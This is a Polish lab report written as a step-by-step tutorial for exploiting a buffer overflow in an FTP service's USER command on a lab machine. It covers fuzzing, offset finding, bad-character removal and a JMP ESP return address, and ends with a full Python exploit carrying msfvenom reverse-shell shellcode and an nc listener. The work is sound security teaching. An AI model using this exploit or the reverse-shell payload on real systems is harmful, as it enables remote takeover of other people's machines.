# Laboratorium 2 BOT 
### Buffer overflow

## Autorzy: 
* Wawrzyńczak Michał
* Gryka Paweł
-----------------------

**Cel: Napisać eksploit  wykorzystujący podatność przepełnienia bufora. Po wykonaniu ekploita musi zostać nawiązane połączenie typu reverse shell.**

# Jak wykonać atak buffer overflow krok po kroku


## Identyfikacja usługi

Na początku należy zidentyfikować a następnie przeskanować atakowanego hosta, by zidentyfikować działające na nim usługi. Można to zrobić na przykład za pomocą polecenia ```namp -sV <adres ip>```
![](https://i.imgur.com/tZld0VQ.png)

W naszym przypadku wiedzieliśmy że podatną usługą jest ```ftp``` ale bez takiej wiedzy należałoby sprawdzić jakie aplikacje działają na znalezionych, otwartych portach i zdecydować, która może być podatna.

## 1. Przeprowadzenie fuzzingu w celu odkrycia ile wysyłanych bajtów danych powoduje przepełnienie bufora i zatrzymanie usługi.
- Przygotowywujemy skrypt fuzzujący
```
#!/usr/bin/python2
import socket,sys
# Create an array of buffers
buffer=["A"]
counter=1
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+15

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.241.133',21))
	s.recv(1024)
	s.send('USER ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
```
- Uruchamiamy skrypt fuzzujący
![](https://i.imgur.com/k9COxYU.png)


- Patrząc na logi z skryptu fuzzującego widzimy, że usługa przestaje działać przy około 256 znaków.

- Następnie modyfikujemy skrypt fuzzujący tak, aby wysyłał jednorazowo 256 bytów.
```
#!/usr/bin/python2
import socket,sys


string = 'A' * 256
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```

- Uruchamiamy poprawiony skrypt fuzzujący
![](https://i.imgur.com/o6bQGQ0.png)


- Po wysłaniu danych takiej długości aplikacja przestaje odpowiadać. W debuggerze możemy sprawdzić wartość rejestru EIP. W rejestrze znajdują się znaki "AAAAAAAA". Oznacza to, że wartość ta została nadpisana - buffer został przepełniony
![](https://i.imgur.com/aZCW3gX.png)






## 2. Znalezienie offsetu.

Wiemy już że da się nadpisać adres powrotu, jednakże nie wiemy jeszcze jak dokładnie trafić w ten adres, gdzie musielibyśmy wpisać nowy adres by zmanipulować działanie aplikacji. By dowiedzieć się tego można skorzystać z metasploit-framework znajdującego się na kali linux, a dokładniej z polecenia ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <znaleziona liczba bajtów z poprzedniego punktu>```. W wyniku podania tego polecenia zostanie wygenerowany ciąg znaków, który pomoże nam w zlokalizowaniu dokładnego offsetu rejestru EIP. Otrzymany ciąg należy wkleić jako wysyłany ciąg do skryptu. W naszym przypadku skrypt wyglądał następująco:

```
#!/usr/bin/python2
import socket,sys


string = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```

Po wykonaniu skryptu należy sprawdzić zawartość rejestru EIP na atakowanej maszynie, a następnie wkleić ją do narzędzia powiązanego z poprzednim, które podaje dokładną wartość offsetu:

![](https://i.imgur.com/hsZe8Lx.png)


## 3. Nadpisanie EIP.
Skoro poznaliśmy już dokładną wartość offsetu (u nas 230 bajtów) to możemy sprawdzić czy umiemy już dokładnie zmanipulować zawartość rejestru EIP. Możemy to zrobić na przykład wstawiając znaki 'B' tylko w miejsca, które mają nadpisać zawartość EIP. By to zrobić, można zmodyfikować skrypt w następujący sposób:

```
#!/usr/bin/python2
import socket,sys


string = 'A' * 230 + 'B' * 4 + 'C' * 20
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```


A następnie go uruchomić i obserwować zmiany w zawartości rejestru EIP. Powinno pojawić się w nim ```42424242``` ponieważ znak 'B' w hex w ASCII to właśnie 42

![](https://i.imgur.com/WHV2eDc.png)

Gdy zobaczymy, że udało się wpisać ```42424242``` do rejestru EIP to znaczy, że już potrafimy dokładnie manipulować zawartością tego rejestru
## 4. Znalezienie Bad Characters.

- Tworzymy skrypt, który wstawi wszystkie możliwe bajty w miejsce gdzie później wstawiany będzie shellcode, takie działanie ma na celu identyfikacje tak zwanych "złych znaków" czyli takich bytów, które przerwą dalsze wczytywanie danych.
```
#!/usr/bin/python2
import socket,sys


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


string = 'A' * 230 + 'B' * 4 + badchars
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```
- Uruchamiamy skrypt i obserwujemy w debugerze zawartość pamięci. Widać, że w pamięci znajdują się wysłane przez nas bajty "... AAAAAAAABBBB0102030405 ...". Widać także, że po bajcie "09" znajdują się "losowe" bajty, w szczególności nie jest to bajt "0A". Oznacza to że bajt "0A" przerwał wczytywanie danych do pamięci.
![](https://i.imgur.com/fZaajf9.png)

- Następnie modyfikujemy skrypt usuwając z niego zły znak, w tym przypadku był to bajt "0A" i powtarzamy procedurę do momentu, aż do pamięci wczytane zostaną wszystkie wysłane dane.


- Finalnie skrypt prezentuje się następująco (pominięto bajty **x00, x0A, x0D**)

```
#!/usr/bin/python2
import socket,sys


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# delete 0x00, x0A, x0D



string = 'A' * 230 + 'B' * 4 + badchars
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```

- W pamięci widać, że wczytane zostały wszystkie wysłane dane
![](https://i.imgur.com/7GnVCMc.png)


## 5. Znalezienie odpowiedniego modułu w pamięci niezabezpieczonego przez ASLR, NX lub SafeSEH.
- Następnym krokiem jest znalezienie odpowiedniego, niezabezpieczonego modułu, który umożliwi nam odnalezienie i wykorzystanie instrukcji JMP ESP, w celu przeskoczenia pod adres wskazywany przez rejestr ESP. Do tego celu używamy skryptu `mona.py` w Immunity Debugger i szukamy modułów niezabezpieczonych przez DEP, ASLR i Safe SEH

![](https://i.imgur.com/Drt3HeX.png)

- Widać, że żaden z modułów nie spełnia naszych wymagań, sprawdzamy więc wszystkie moduły po kolei w poszukiwaniu miejsca gdzie znajduje się instrukcja JMP ESP i sprawdzamy czy zadziała ona po umieszczeniu tego adresu w EIP. W tym celu sprawdzamy kod szesnastkowy instrukcji JMP ESP

![](https://i.imgur.com/qHCs9GV.png)

- Następnie ponownie używamy skryptu `mona.py`, polecania `!mona find -s "\xff\xe4" -m SLMFC.DLL` aby wyszukać adresy pamięci gdzie znajdują się bajty `\xff\xe4`
![](https://i.imgur.com/xjdjfAu.png)

- Wybieramy adres który nie zawiera złych znaków (np. `\xfb\x41\xbd\x7c`). Wykorzystując go w naszym eksploicie musimy pamiętać aby zastosować odpowiednią końcówkowość (grubukońcuwkowość/cinkokońcówkowość)


## 6. Wygenerowanie shellcode.

By wykonać akcje na atakowanym hoście potrzebujemy wygenerować ```shellcode```, który wykona użyteczne dla nas kroki po udanej próbie exploitacji usługi. Shellcode taki możemy na przykład wygenerować za pomocą polecenia ```msfvenom -p windows/shell_reverse_tcp LHOST=<local IP> LPORT=<local port> EXITFUNC=thread -f c -a x86 -b “<bad characters>”```. W naszym przypadku wyglądało to w taki sposób:

![](https://i.imgur.com/W5hRRKc.png)

## 7. Uruchomienie eksploita i radość z uzyskanego połączenia reverse shell.

Żeby wreszcie wykorzystać wszystko czego się dowiedzieliśmy komponujemy ostatni skrypt, który w odpowiednim miejscu nadpisze rejester EIP i nieco dalej wstrzyknie shellcode, który rozpocznie połączenie typu reverse-shell. Skrypt wygląda praktycznie identycznie, różnicą jest to, że wysyłany string będzie zawierał kolejno ```'A'*offset```, adres instrukcji ```JMP ESP```, 50 znaków ```NOP``` oraz wygenerowany ```shellcode```. Poniżej widać skrypt użyty przez nas:

```
#!/usr/bin/python2
import socket,sys


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shell_code = ("\xba\xcd\x4b\xc9\xc2\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"+
"\x52\x31\x56\x12\x03\x56\x12\x83\x0b\x4f\x2b\x37\x6f\xb8\x29"+
"\xb8\x8f\x39\x4e\x30\x6a\x08\x4e\x26\xff\x3b\x7e\x2c\xad\xb7"+
"\xf5\x60\x45\x43\x7b\xad\x6a\xe4\x36\x8b\x45\xf5\x6b\xef\xc4"+
"\x75\x76\x3c\x26\x47\xb9\x31\x27\x80\xa4\xb8\x75\x59\xa2\x6f"+
"\x69\xee\xfe\xb3\x02\xbc\xef\xb3\xf7\x75\x11\x95\xa6\x0e\x48"+
"\x35\x49\xc2\xe0\x7c\x51\x07\xcc\x37\xea\xf3\xba\xc9\x3a\xca"+
"\x43\x65\x03\xe2\xb1\x77\x44\xc5\x29\x02\xbc\x35\xd7\x15\x7b"+
"\x47\x03\x93\x9f\xef\xc0\x03\x7b\x11\x04\xd5\x08\x1d\xe1\x91"+
"\x56\x02\xf4\x76\xed\x3e\x7d\x79\x21\xb7\xc5\x5e\xe5\x93\x9e"+
"\xff\xbc\x79\x70\xff\xde\x21\x2d\xa5\x95\xcc\x3a\xd4\xf4\x98"+
"\x8f\xd5\x06\x59\x98\x6e\x75\x6b\x07\xc5\x11\xc7\xc0\xc3\xe6"+
"\x28\xfb\xb4\x78\xd7\x04\xc5\x51\x1c\x50\x95\xc9\xb5\xd9\x7e"+
"\x09\x39\x0c\xd0\x59\x95\xff\x91\x09\x55\x50\x7a\x43\x5a\x8f"+
"\x9a\x6c\xb0\xb8\x31\x97\x53\x07\x6d\x66\x22\xef\x6c\x88\x34"+
"\xac\xf9\x6e\x5c\x5c\xac\x39\xc9\xc5\xf5\xb1\x68\x09\x20\xbc"+
"\xab\x81\xc7\x41\x65\x62\xad\x51\x12\x82\xf8\x0b\xb5\x9d\xd6"+
"\x23\x59\x0f\xbd\xb3\x14\x2c\x6a\xe4\x71\x82\x63\x60\x6c\xbd"+
"\xdd\x96\x6d\x5b\x25\x12\xaa\x98\xa8\x9b\x3f\xa4\x8e\x8b\xf9"+
"\x25\x8b\xff\x55\x70\x45\xa9\x13\x2a\x27\x03\xca\x81\xe1\xc3"+
"\x8b\xe9\x31\x95\x93\x27\xc4\x79\x25\x9e\x91\x86\x8a\x76\x16"+
"\xff\xf6\xe6\xd9\x2a\xb3\x07\x38\xfe\xce\xaf\xe5\x6b\x73\xb2"+
"\x15\x46\xb0\xcb\x95\x62\x49\x28\x85\x07\x4c\x74\x01\xf4\x3c"+
"\xe5\xe4\xfa\x93\x06\x2d")



string = 'A' * 230 + "\xfb\x41\xbd\x7c" + "\x90" * 50 + shell_code
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.241.133',21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
```

Następnie należy uruchomić nasłuchiwanie na połączenie reverse shell na hoście atakującym. Można to zrobić na przykład za pomocą polecenia ```nc -lnvp <nr portu>```. Po włączeniu nasłuchiwania należy wreszcie uruchomić finalną wersję naszego skryptu.
![](https://i.imgur.com/xhVvTcz.png)
W tym momencie można się chwilę pomodlić i oczekiwać na reakcję w terminalu nasłuchującym na połączenie. Po pojawieniu się informacji o połączeniu należy wydać głośny sygnał dźwiękowy "ŁIIIIIIIIII" mówiący o powodzeniu i pokazujący radość. Po ochłonięciu można sprawdzić jakim jesteśmy użytkownikiem. 
![](https://i.imgur.com/h9AdGMn.png)

